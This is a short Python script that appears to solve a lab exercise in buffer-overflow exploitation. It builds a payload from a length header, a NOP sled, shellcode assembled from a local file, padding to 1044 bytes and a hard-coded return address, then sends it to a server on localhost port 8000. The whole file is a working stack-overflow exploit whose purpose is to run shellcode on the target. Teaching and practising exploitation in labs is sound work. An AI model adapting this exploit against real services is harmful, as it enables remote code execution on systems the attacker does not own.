#!/usr/bin/python

import os, socket
import assemble
import struct

HOST        = '127.0.0.1'
SERVER_PORT = 8000
LOCAL_PORT  = 1337


PATH_TO_SHELLCODE = './shellcode.asm'


def get_shellcode():
    return assemble.assemble_file("shellcode.asm")


def get_payload():
    my_shell_code =  get_shellcode();
    msg_size = '\x00\x00\x04\x14' # \x04\x14 == 1044
    total = msg_size +  '\x90' * (16) + my_shell_code +"\x90"*(1044-len(my_shell_code)-4-16) + struct.pack('<I', 0xbfffdd6c) 
    return  total



def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, SERVER_PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
